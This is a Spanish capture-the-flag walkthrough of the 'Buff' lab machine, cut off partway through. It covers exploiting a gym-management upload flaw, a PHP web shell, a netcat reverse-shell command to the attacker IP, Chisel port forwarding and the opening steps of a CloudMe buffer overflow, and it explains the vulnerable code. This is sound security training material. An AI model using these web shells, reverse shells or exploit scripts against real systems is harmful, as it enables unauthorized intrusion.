â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ \u0026gt; file test.php test.php: GIF image data 16188 x 26736 Para que se entienda mejor vamos a cambiar los magic bytes del script a los de GIF8;, aunque tal y como viene por default ya funciona\nPNG_magicBytes = \u0026#39;GIF8;\u0026#39; Por Ãºltimo ejecutamos el script\n\u0026gt; python2 48506.py http://10.10.10.198:8080/ /usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release. /\\omo instalar mona.py en Immunity Debugger /vvvvvvvvvvvv \\--------------------------------------, `^^^^^^^^^^^^ /============BOKU=====================\u0026#34; \\/ [+] Successfully connected to webshell. F8;\u0026gt; Ahora ya tenemos una shell que en verdad no es una shell, me explico, simplemente hemos subido un script en php que ejecuta todo lo que le pasamos por el parÃ¡metro telepathy\n\u0026gt; curl \u0026#34;http://10.10.10.198:8080/upload/kamehameha.php?telepathy=whoami\u0026#34; GIF8; buff\\shaun QuÃ© cÃ³digo tiene kamehameha.php que nos permite ejecutar comandos?\rEl archivo kamehameha.php tiene el siguiente cÃ³digo\n\u0026lt;?php echo shell_exec($_GET[\u0026#34;telepathy\u0026#34;]); ?\u0026gt; Lo que hace bÃ¡sicamente es pasarle a la funciÃ³n shell_exec todo lo que recibe por GET por el parÃ¡metro telepathy.\nLa funciÃ³n shell_exec lo que hace es ejecutar comandos en el sistema, pero no muestra el output, para hacer que muestre el output hay que poner el echo delante\nSin echo\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php shell_exec(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php Con echo\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php echo shell_exec(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo Si shell_exec no funcionara o estÃ¡ bloqueado, se pueden usar otras funciones, a continuaciÃ³n os dejo unos ejemplos\nsystem()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php system(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo passthru()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php passthru(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo exec()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php echo exec(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo popen()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php 2 $handle = popen(\u0026#39;whoami\u0026#39;, \u0026#39;r\u0026#39;); 3 $read = fread($handle, 2096); 4 pclose($handle); 5 echo $read; 6 ?\u0026gt; 7 d3bo~\u0026gt; php test.php d3bo Vamos a usar este RCE para mandarnos una Reverse Shell en condiciones.\nPara ello primero buscamos un nc.exe que normalmente en kali ya viene instalado, despuÃ©s nos lo movemos al directorio actual y abrimos un servidor con samba para poder ejecutarlo desde la otra mÃ¡quina\n\u0026gt; locate nc.exe /home/d3b0o/Desktop/buff/nc.exe /opt/SecLists/Web-Shells/FuzzDB/nc.exe /usr/lib/mono/4.5/cert-sync.exe /usr/share/seclists/Web-Shells/FuzzDB/nc.exe /usr/share/windows-resources/binaries/nc.exe \u0026gt; cp /usr/share/windows-resources/binaries/nc.exe . \u0026gt; impacket-smbserver smb $(pwd) -smb2support Impacket v0.11.0 - Copyright 2023 Fortra [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed Nos ponemos en escucha por el puerto 443\nrlwrap nc -nlvp 443 Por Ãºltimo aprovechÃ¡ndonos del RCE vamos a ejecutar el siguiente comando\n//10.10.14.31/smb/nc.exe -e cmd 10.10.14.31 443 curl -s -G \u0026#34;http://10.10.10.198:8080/upload/kamehameha.php\u0026#34; --data-urlencode \u0026#34;telepathy=//10.10.14.31/smb/nc.exe -e cmd 10.10.14.31 443\u0026#34; Â¡Recibimos la reverse shell !!!\nAnalizando la vulnerabilidad Â¿Porque conseguimos ejecutar comandos? Que estÃ¡ mal en el cÃ³digo del upload.php?\nDentro de los exploits de exploidb suele haber un enlace para descargar la aplicaciÃ³n vulnerable, en este caso el enlace es https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/\nDesde ahÃ­, nos descargamos el cÃ³digo. Una vez descargado y descomprimido podemos ver el contenido del archivo upload.php que es el que hemos usado para subir un archivo php malicioso\n\u0026lt;?php include_once \u0026#39;include/db_connect.php\u0026#39;; include_once \u0026#39;include/functions.php\u0026#39;; $user = $_GET[\u0026#39;id\u0026#39;]; $allowedExts = array(\u0026#34;jpg\u0026#34;, \u0026#34;jpeg\u0026#34;, \u0026#34;gif\u0026#34;, \u0026#34;png\u0026#34;,\u0026#34;JPG\u0026#34;); $extension = @end(explode(\u0026#34;.\u0026#34;, $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;])); if(isset($_POST[\u0026#39;pupload\u0026#39;])){ if ((($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/gif\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/jpeg\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/JPG\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/png\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/pjpeg\u0026#34;)) \u0026amp;\u0026amp; ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;] \u0026lt; 20000000000000) \u0026amp;\u0026amp; in_array($extension, $allowedExts)) { if ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] \u0026gt; 0) { echo \u0026#34;Return Code: \u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { if (file_exists(\u0026#34;upload/\u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;])) { unlink(\u0026#34;upload/\u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); } else { $pic=$_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; $conv=explode(\u0026#34;.\u0026#34;,$pic); $ext=$conv[\u0026#39;1\u0026#39;]; move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], \u0026#34;upload/\u0026#34;. $user.\u0026#34;.\u0026#34;.$ext); $url=$user.\u0026#34;.\u0026#34;.$ext; $query=\u0026#34;update members set pic=1, picName=\u0026#39;$url\u0026#39; where id=\u0026#39;$user\u0026#39;\u0026#34;; if($upl=$mysqli-\u0026gt;query($query)){ header(\u0026#34;location: profile/i.php\u0026#34;); } } } } else header(\u0026#34;location: /profile/i.php\u0026#34;); } ?\u0026gt; Al principio del script se declaran unas variables:\nuser, que equivale a lo que le pasamos por get, por el parÃ¡metro id, allowedExts, esta variable es una array con todas las extensiones permitidas (jpg,png,gif\u0026hellip;) extensiÃ³n, guarda la extensiÃ³n del archivo de la siguiente forma $extension = @end(explode(\u0026#34;.\u0026#34;, $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;])); EstÃ¡ haciendo uso de la funciÃ³n explode para separar el nombre en distintas partes separadas por \u0026ldquo;.\u0026rdquo;\nd3bo\u0026gt; cat test.php 1 \u0026lt;?php 2 $test = explode(\u0026#34;.\u0026#34;, \u0026#34;test.php.png\u0026#34; ); 3 print_r($test) 4 ?\u0026gt; d3bo\u0026gt; php test.php Array ( [0] =\u0026gt; test [1] =\u0026gt; php [2] =\u0026gt; png ) AdemÃ¡s aÃ±ade @end para que solo muestre el Ãºltimo\nd3bo\u0026gt; cat test.php 1 \u0026lt;?php 2 $test = @end(explode(\u0026#34;.\u0026#34;, \u0026#34;test.php.png\u0026#34; )); 3 echo $test 4 ?\u0026gt; d3bo\u0026gt; php test.php png Con esto consigue sacar la extensiÃ³n del archivo.\nEl cÃ³digo sigue con lo siguiente\nif ((($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/gif\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/jpeg\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/JPG\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/png\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/pjpeg\u0026#34;)) \u0026amp;\u0026amp; ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;] \u0026lt; 20000000000000) \u0026amp;\u0026amp; in_array($extension, $allowedExts)) AquÃ­ estÃ¡ haciendo 3 comprobaciones\nContent-Type: Primero comprueba si el content type es image/gif o image/jpeg o image/JPG o image/png o image/pjpeg TamaÃ±o: TambiÃ©n comprueba que el archivo sea mÃ¡s pequeÃ±o que 20,000,000,000,000 bytes ExtensiÃ³n: Por Ãºltimo comprueba que la extensiÃ³n del archivo este en la array allowedExts Si pasa todas estas validaciones pasa al la siguiente secciÃ³n\n$pic=$_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; $conv=explode(\u0026#34;.\u0026#34;,$pic); $ext=$conv[\u0026#39;1\u0026#39;]; move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], \u0026#34;upload/\u0026#34;. $user.\u0026#34;.\u0026#34;.$ext); $url=$user.\u0026#34;.\u0026#34;.$ext; AquÃ­ es donde empieza la vulnerabilidad\nVuelve a dividir el nombre en una array con la funciÃ³n explode usando de separador el \u0026ldquo;.\u0026rdquo; y guarda en la variable ext la posiciÃ³n 1 de la array. DespuÃ©s sube el archivo con el nombre del usuario que pasamos por GET y la extensiÃ³n.\nEl problema es que no se estÃ¡ calculando bien la extensiÃ³n, ya que si probamos de poner 2 extensiones, se queda con la primera\nd3bo\u0026gt; cat test2.php 1 \u0026lt;?php 2 $pic=\u0026#34;shell.php.png\u0026#34;; 3 $conv=explode(\u0026#34;.\u0026#34;,$pic); 4 $ext=$conv[\u0026#39;1\u0026#39;]; 5 echo $ext 6 ?\u0026gt; d3bo\u0026gt; php test2.php php El nombre shell.php.png pasarÃ­a todas las validaciones porque es un png, pero cuando se suba lo guardarÃ¡ con el nombre del usuario y la extensiÃ³n php, ya que coge la 1 posiciÃ³n de la array en vez de la Ãºltima\nPara que no pasara esto se tendrÃ­a que usar \u0026lsquo;@end\u0026rsquo; como se hacÃ­a al principio del cÃ³digo\nd3bo\u0026gt; cat test2.php 1 \u0026lt;?php 2 $pic=\u0026#34;shell.php.png\u0026#34;; 3 $conv=explode(\u0026#34;.\u0026#34;,$pic); 4 $ext=@end($conv); 5 echo $ext 6 ?\u0026gt; d3bo\u0026gt; php test2.php png Podemos probar todo esto creando nuestro propio script\n\u0026gt; cat exploit.py 1 â”‚ import requests 2 â”‚ 3 â”‚ def subir_archivo(s): 4 â”‚ url = \u0026#39;http://10.10.10.198:8080/upload.php?id=user2\u0026#39; 5 â”‚ contenido_archivo = \u0026#39;GIF8;\\n \u0026lt;?php system(\u0026#34;whoami\u0026#34;) ?\u0026gt;\u0026#39; 6 â”‚ archivo = {\u0026#39;file\u0026#39;: (\u0026#39;shell.php.gif\u0026#39;, contenido_archivo, \u0026#39;image/gif\u0026#39;)} 7 â”‚ fdata = {\u0026#39;pupload\u0026#39;: \u0026#39;upload\u0026#39;} 8 â”‚ try: 9 â”‚ respuesta = s.post(url, files=archivo, data=fdata) 10 â”‚ except Exception as e: 11 â”‚ print(\u0026#34;Error al realizar la solicitud:\u0026#34;, e) 12 â”‚ 13 â”‚ s = requests.Session() 14 â”‚ subir_archivo(s) 15 â”‚ r = s.get(\u0026#34;http://10.10.10.198:8080/upload/user2.php\u0026#34;) 16 â”‚ print(r.text) \u0026gt; python3 exploit.py GIF8; buff\\shaun Escalada de privilegios Dentro del directorio de Downloads hay un archivo llamado CloudMe_1112.exe\nC:\\Users\\shaun\u0026gt;tree /f 3D Objects Contacts Desktop user.txt Documents Tasks.bat Downloads CloudMe_1112.exe .... Con una bÃºsqueda rÃ¡pida por google se puede encontrar porque puerto funciona por defecto CloudMe (8888)\nCon un netstat -a podemos ver que el puerto 8888 estÃ¡ abierto en local\nC:\\xampp\\htdocs\\gym\\upload\u0026gt;netstat -a netstat -a Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 BUFF:0 LISTENING TCP 0.0.0.0:445 BUFF:0 LISTENING TCP 0.0.0.0:5040 BUFF:0 LISTENING TCP 0.0.0.0:7680 BUFF:0 LISTENING TCP 0.0.0.0:8080 BUFF:0 LISTENING TCP 0.0.0.0:49664 BUFF:0 LISTENING TCP 0.0.0.0:49665 BUFF:0 LISTENING TCP 0.0.0.0:49666 BUFF:0 LISTENING TCP 0.0.0.0:49667 BUFF:0 LISTENING TCP 0.0.0.0:49668 BUFF:0 LISTENING TCP 0.0.0.0:49669 BUFF:0 LISTENING TCP 10.10.10.198:139 BUFF:0 LISTENING TCP 10.10.10.198:8080 10.10.14.31:55448 ESTABLISHED TCP 10.10.10.198:49771 10.10.14.31:https ESTABLISHED TCP 127.0.0.1:3306 BUFF:0 LISTENING TCP 127.0.0.1:8888 BUFF:0 LISTENING Con un searchsploit encontramos que la versiÃ³n del programa que habÃ­a en la carpeta de \u0026lsquo;Downloads\u0026rsquo; es vulnerable a un Buffer Overflow.\n\u0026gt; searchsploit CloudMe 1.11.2 ----------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------- --------------------------------- CloudMe 1.11.2 - Buffer Overflow (PoC) | windows/remote/48389.py CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR) | windows/local/48499.txt CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR) | windows/local/48840.py CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt | windows/remote/46218.py CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt | windows/remote/46218.py CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass) | windows_x86-64/remote/46250.py CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass) | windows_x86-64/remote/46250.py ----------------------------------------------------------------------------- --------------------------------- PodrÃ­amos usar el script de exploitdb, pero vamos a hacerlo manual.\nBuffer Overflow Primero de todo vamos a usar una mÃ¡quina virtual con un windows 7 de 32 Bits, dentro del windows vamos a instalar CloudMe 1.11.2, Immunity Debuger y mona.py\nEl Immunity Debuger lo vamos a usar para analizar el binario durante la ejecuciÃ³n. El CloudMe 1.11.2 va a estar ejecutÃ¡ndose en nuestra, mÃ¡quina para poder analizarlo y simular ataques como si fuera la mÃ¡quina vÃ­ctima mona.py Mona.py es un script en python que funciona con Immunity Debuger, vamos a usarlo para automatizar distintos procesos durante la explotaciÃ³n del buffer overflow Como instalar mona.py en Immunity Debugger\rDescargamos el archivo de github\nhttps://raw.githubusercontent.com/corelan/mona/master/mona.py\nY lo movemos a C:\\Program Files\\Immunity Inc\\Immunity Debugger\\PyCommands\nLo siguiente es ejecutar el CloudMe 1.11.2 para ello necesitamos crear una cuenta de CloudMe.\nPortfordwarding Si recordamos CloudMe funciona por el puerto 8888 en local asÃ­ que no podemos ver este puerto desde el Kali, por lo que tenemos que hacer portforwarding, para ello usamos Chisel\nEn la mÃ¡quina atacante nos descargamos Chisel y lo ejecutamos\nsudo ./chisel server --reverse -p 1234 ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p Especificamos el puerto por el cual vamos a tener el servidor chisel server Abre chisel en modo servidor \u0026ndash;reverse Permite a los clientes configurar reenvÃ­os de puertos inversos En el windows vamos a descargar tambiÃ©n Chisel y lo ejecutamos\nchisel.exe client 192.168.1.145:1234 R:8888:127.0.0.1:8888 ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n 192.168.1.145:1234 Especificamos la ip de la mÃ¡quina atacante en la cual tenemos el chisel en modo server y el puerto en el cual tenemos chisel corriendo client Abre chisel en modo cliente R:8888:127.0.0.1:8888 Indicamos que el puerto 8888 de la mÃ¡quina Windows se mapee al puerto 8888 de la mÃ¡quina atacante. Lo que significa que ahora el puerto 8888 de la mÃ¡quina atacante es el mismo que el 8888 de la mÃ¡quina Windows Para comprobar que ha funcionado todo correcto podemos comprobar si el puerto 8888 se ha abierto en nuestro kali, de la siguiente forma:\nss -tnlp | grep 8888 LISTEN 0 4096 *:8888 *:* ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n ss Se usa para mostrar informaciÃ³n sobre los sockets de red, como conexiones TCP, UDP y estadÃ­sticas de socket -t Muestra Ãºnicamente las conexiones TCP. -n Muestra las direcciones y puertos numÃ©ricamente en lugar de resolver nombres. -l Muestra solo las conexiones en estado de escucha (listening). -p Muestra los procesos asociados con los sockets. grep En este caso lo usamos para filtrar por la lÃ­nea que contenga el puerto 8888 Calcular Offset Empezamos mandando muchos caracteres para ver si la aplicaciÃ³n deja de funcionar\npython2 -c \u0026#39;print \u0026#34;A\u0026#34;*7000\u0026#39; | nc 127.0.0.1 8888 Ahora en el windows aparece el siguiente mensaje\nPara saber por quÃ© crashea vamos a abrirlo otra vez y hacer un attach (File\u0026gt;Attach\u0026gt;CloudMe) desde Immunity Debugger, y le damos al play\nRepetimos el mismo proceso de mandar un input grande\npython2 -c \u0026#39;print \u0026#34;A\u0026#34;*7000\u0026#39; | nc 127.0.0.1 8888 Ahora desde immunity debugger podemos ver que hay registros como el EIP,ESP,EBP,\u0026hellip; que tienen de valor 41, el 41 es el resultado del carÃ¡cter \u0026lsquo;A\u0026rsquo; en hexadecimal, esto significa que al poner una cadena mÃ¡s larga que el tamaÃ±o de buffer que tenÃ­a asignada la variable, se han sobreescrito registros de la memoria para poder guardar las \u0026lsquo;A\u0026rsquo;. El problema estÃ¡ en que por ejemplo si cambiamos el valor del EIP el programa no sabe por donde continuar, ya que el EIP \u0026ldquo;Instruction Pointer\u0026rdquo; (Puntero de InstrucciÃ³n) contiene la direcciÃ³n de la memoria de la prÃ³xima instrucciÃ³n, si le ponemos una direcciÃ³n que no existe como en este caso 41414141, simplemente deja de funcionar.\nVamos a ver cuantas A tenemos que poner para llegar hasta el EIP, para ello vamos a crear una cadena especialmente diseÃ±ada para esto\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 7000 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3A... ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -l 7000 Especificamos la cantidad de caracteres que va a tener la cadena Se lo mandamos a CloudMe\n\u0026gt; nc 127.0.0.1 8888 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1A... Obviamente, CloudMe se ha vuelto a petar, pero si observamos el EIP, vemos que ahora vale 316A4230.\nCon el siguiente comando se calcula automÃ¡ticamente el offset (La cantidad de \u0026lsquo;A\u0026rsquo;) para llegar al EIP\n\u0026gt; /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 7000 -q 316A4230 [*] Exact match at offset 1052 ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -l 7000 Especificamos la cantidad de caracteres que tenÃ­a la cadena -q 316A4230 Con -q ponemos los caracteres que salen en el EIP El comando nos dice que el offset es 1052.\nPara comprobarlo mandaremos 1052 \u0026lsquo;A\u0026rsquo; y 4 \u0026lsquo;B\u0026rsquo;, si el cÃ¡lculo ha salido bien deberÃ­amos ver desde immunity debugger que el eip vale 42424242 que es BBBB en hexadecimal\npython2 -c \u0026#39;print \u0026#34;A\u0026#34;*1052 + \u0026#34;B\u0026#34;*4\u0026#39; | nc 127.0.0.1 8888 Efectivamente, despuÃ©s de ejecutar esto el EIP pasa a valer 42424242 que es lo mismo que BBBB, esto sÃ­gnica que ya tenemos el control del EIP y por ende el control del flujo del programa.\nEsto lo vamos a usar para modificar el EIP para que salte al ESP y dentro del ESP vamos a cargar unas instrucciones para ejecutar comandos.\nMandamos el mismo payload que antes, pero ahora con 2000 C que van a representar las intrucciones que pondremos mÃ¡s tarde.\npython2 -c \u0026#39;print \u0026#34;A\u0026#34;*1052 + \u0026#34;B\u0026#34;*4 + \u0026#34;C\u0026#34;*200\u0026#39; | nc 127.0.0.1 8888 Desde el Immunity Debugger vemos que el ESP comienza justo despuÃ©s del EIP.\nBadchars Â¿QuÃ© es un badchar?\nUn \u0026ldquo;badchar\u0026rdquo; es un carÃ¡cter que, cuando se procesa, puede causar problemas porque el sistema no lo interpreta de la manera esperada.\nÂ¿Como podrÃ­amos comprobar si hay algÃºn carÃ¡cter que no se procesa bien?, pues mandando todos los tipos de caracteres y ver si dan errores.\nHasta ahora hemos estado mandando onelines de python, pero ahora vamos a hacer un script porque vamos a tener que aÃ±adir mÃ¡s cosas\nfrom pwn import * from struct import pack offset = 1052 before_eip = b\u0026#34;A\u0026#34; * offset eip = b\u0026#34;BBBB\u0026#34; payload = before_eip + eip host, port = \u0026#34;127.0.0.1\u0026#34;, 8888 r = remote(host, port) r.sendline(payload) A este script le tenemos que aÃ±adir los caracteres que comprobaremos si son badchars. Para sacar la lista usaremos el programa badchars que lo podemos instalar con pip\n\u0026gt; pip3 install badchars \u0026gt; badchars -f python badchars = ( \u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\u0026#34; \u0026#34;\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\u0026#34; \u0026#34;\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\u0026#34; \u0026#34;\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\u0026#34; \u0026#34;\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; \u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\u0026#34; \u0026#34;\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; \u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\u0026#34; \u0026#34;\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\u0026#34; \u0026#34;\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\u0026#34; \u0026#34;\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34; ) from pwn import * from struct import pack offset = 1052 before_eip = b\u0026#34;A\u0026#34; * offset eip = b\u0026#34;BBBB\u0026#34; badchars = ( b\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\u0026#34; b\u0026#34;\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; b\u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\u0026#34; b\u0026#34;\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; b\u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\u0026#34; b\u0026#34;\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; b\u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\u0026#34; b\u0026#34;\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; b\u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\u0026#34; b\u0026#34;\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; b\u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\u0026#34; b\u0026#34;\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; b\u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\u0026#34; b\u0026#34;\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; b\u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\u0026#34; b\u0026#34;\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34; ) payload = before_eip + eip + badchars host, port = \u0026#34;127.0.0.1\u0026#34;, 8888 r = remote(host, port) r.sendline(payload) Desde immunity debbuger podemos comprobar 1 a 1 si el carÃ¡cter se muestra o no\nEsto es un tostÃ³n, por eso antes hemos instalado mona.py, que como dije antes nos servirÃ­a para automatizar procesos\nEmpezamos con mona configurando el directorio de trabajo\n!mona config -set workingfolder C:\\Users\\arnau\\Desktop\\bof Seguimos creando una cadena de bytes para comprobar los badchars, pero excluimos el \\x00 (Null byte) porque siempre da problemas\n!mona bytearray -b \u0026#34;\\x00\u0026#34; Dentro de la carpeta que hemos configurado como \u0026ldquo;workingfolder\u0026rdquo; han aparecido dos archivos. Dentro del bytearray.txt tenemos la misma cadena de caracteres que hemos configurado antes, asÃ­ que no nos va a hacer falta modificar el script. El archivo que vamos a usar es el bytearray.bin.\n!mona compare -f C:\\Users\\arnau\\Desktop\\bof\\bytearray.bin -a 0022F930 Este comando lo que va a hacer es comprobar si los caracteres se muestran bien, o dan algÃºn problema. Con el parÃ¡metro -a 